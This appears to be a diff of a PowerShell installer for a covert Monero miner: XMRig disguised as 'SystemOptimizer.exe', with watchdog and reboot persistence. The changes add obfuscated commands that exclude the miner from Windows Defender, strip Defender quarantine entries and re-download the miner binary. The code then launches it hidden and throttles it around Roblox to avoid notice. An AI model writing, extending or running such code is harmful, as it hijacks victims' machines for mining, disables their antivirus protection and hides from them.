@@ -412,35 +412,119 @@ Show ".." "Starting watchdog (will start exactly 1 miner)..."
 $shell = New-Object -ComObject WScript.Shell
 $shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
 
-Show ".." "Waiting for miner to initialize (~15s)..."
-Start-Sleep 18
+Show ".." "Waiting for miner to initialize (~20s)..."
+Start-Sleep 20
 
-# ---- VERIFY ----
+# ---- VERIFY WITH DIAGNOSTICS ----
 $proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
 $minerCount = @($proc).Count
+
 if ($proc -and $minerCount -eq 1) {
-    Show "OK" "Miner RUNNING -- exactly 1 instance (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
+    Show "OK" "Miner RUNNING (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
 } elseif ($minerCount -gt 1) {
-    Show "!!" "Multiple miners detected ($minerCount) -- watchdog will fix this in 30s"
+    Show "!!" "Multiple miners ($minerCount) -- watchdog will fix in 30s"
 } else {
-    Show ".." "Miner starting... watchdog will launch it within 30s"
+    # MINER NOT RUNNING -- diagnose why
+    Show "!!" "Miner not running yet. Diagnosing..."
+    
+    # Check 1: Does binary still exist?
+    if (-not (Test-Path $BINARY)) {
+        Show "X" "BINARY MISSING -- Defender likely quarantined it!"
+        Show ".." "Trying to restore and re-exclude..."
+        # Re-add exclusion
+        try {
+            $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"; $c5="Process"
+            iex "$c1$c2 $c3$c4 '$BASE'"
+            iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'"
+        } catch {}
+        # Try to restore from Defender quarantine
+        try {
+            $threats = Get-MpThreat -ErrorAction SilentlyContinue
+            if ($threats) {
+                $threats | ForEach-Object { 
+                    cmd /c "powershell -c `"Remove-MpThreat -ThreaTID $($_.ThreatID)`"" 2>$null
+                }
+            }
+        } catch {}
+        Start-Sleep 3
+        # Re-download if still missing
+        if (-not (Test-Path $BINARY)) {
+            Show ".." "Re-downloading binary..."
+            $zipPath = "$env:TEMP\so_pkg.zip"
+            try {
+                $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
+                $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
+                if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }
+                if ($asset) {
+                    Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
+                }
+            } catch {
+                try { Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300 } catch {}
+            }
+            if (Test-Path $zipPath) {
+                $tmp = "$env:TEMP\so_extract2"
+                Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
+                $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+                if ($exe) { Copy-Item $exe.FullName $BINARY -Force }
+                Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
+                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+            }
+        }
+        if (Test-Path $BINARY) {
+            Show "OK" "Binary restored. Starting miner..."
+            $shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
+            Start-Sleep 15
+            $proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
+            if ($proc) { Show "OK" "Miner RUNNING after restore (PID: $($proc.Id))" }
+            else { Show "X" "Still not running. Defender may keep blocking it." }
+        } else {
+            Show "X" "Could not restore binary. Defender is blocking."
+            Write-Host ""
+            Write-Host "  FIX: Open Windows Security > Virus Protection > " -ForegroundColor Yellow
+            Write-Host "  Manage Settings > Add Exclusion > Folder > " -ForegroundColor Yellow
+            Write-Host "  C:\ProgramData\SystemOptimizer" -ForegroundColor Yellow
+            Write-Host "  Then run this command again." -ForegroundColor Yellow
+        }
+    } else {
+        # Binary exists but won't start
+        Show ".." "Binary exists. Trying direct launch..."
+        $testProc = Start-Process -FilePath $BINARY -ArgumentList "--config=`"$CONFIG`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
+        Start-Sleep 10
+        if ($testProc -and -not $testProc.HasExited) {
+            Show "OK" "Direct launch worked! (PID: $($testProc.Id))"
+        } else {
+            Show "X" "Binary crashes on start. Checking log..."
+            if (Test-Path $LOGFILE) {
+                $lastLines = Get-Content $LOGFILE -Tail 5 -ErrorAction SilentlyContinue
+                foreach ($l in $lastLines) { Show "--" $l }
+            }
+            # Check if config is valid
+            try {
+                Get-Content $CONFIG -Raw | ConvertFrom-Json | Out-Null
+                Show "OK" "Config JSON is valid"
+            } catch {
+                Show "X" "Config JSON is BROKEN -- recreating..."
+            }
+        }
+    }
 }
 
+# Watchdog check
 $wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
     Where-Object { $_.CommandLine -like "*watchdog*" }
 $wdCount = @($wd).Count
-if ($wdCount -eq 1) { Show "OK" "Watchdog ACTIVE -- exactly 1 instance (PID: $($wd.ProcessId))" }
-elseif ($wdCount -gt 1) { Show "!!" "Multiple watchdogs ($wdCount) -- will self-correct" }
+if ($wdCount -ge 1) { Show "OK" "Watchdog ACTIVE" }
+else { Show "!!" "Watchdog not running -- will restart on next boot" }
 
 if ($proc) {
-    $conn = Get-NetTCPConnection -OwningProcess $proc[0].Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }
+    $conn = Get-NetTCPConnection -OwningProcess $proc.Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }
     if ($conn) { Show "OK" "Connected to mining pool!" }
 }
 
 # ---- FINAL REPORT ----
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Green
-Write-Host "    SETUP COMPLETE (v4)" -ForegroundColor Green
+Write-Host "    SETUP COMPLETE" -ForegroundColor Green
 Write-Host "  ====================================================" -ForegroundColor Green
 Write-Host "  Worker:    $WORKER" -ForegroundColor White
 Write-Host "  Dashboard: https://moneroocean.stream" -ForegroundColor White
@@ -448,8 +532,8 @@ Write-Host ""
 Write-Host "  PROTECTION:" -ForegroundColor Yellow
 Write-Host "    - Kill miner? Watchdog restarts it in 30s" -ForegroundColor Gray
 Write-Host "    - Watchdog dies? Guardian restarts it in 5min" -ForegroundColor Gray
-Write-Host "    - Reboot? ONSTART task + Registry + Startup folder" -ForegroundColor Gray
-Write-Host "    - Multiple instances? Auto-killed, only 1 survives" -ForegroundColor Gray
+Write-Host "    - Reboot? ONSTART task + Registry + Startup" -ForegroundColor Gray
+Write-Host "    - Multiple instances? Auto-killed, only 1 runs" -ForegroundColor Gray
 Write-Host ""
 Write-Host "  SMART CPU:" -ForegroundColor Yellow
 Write-Host "    - Normal/Roblox: 30% CPU (idle priority)" -ForegroundColor Gray
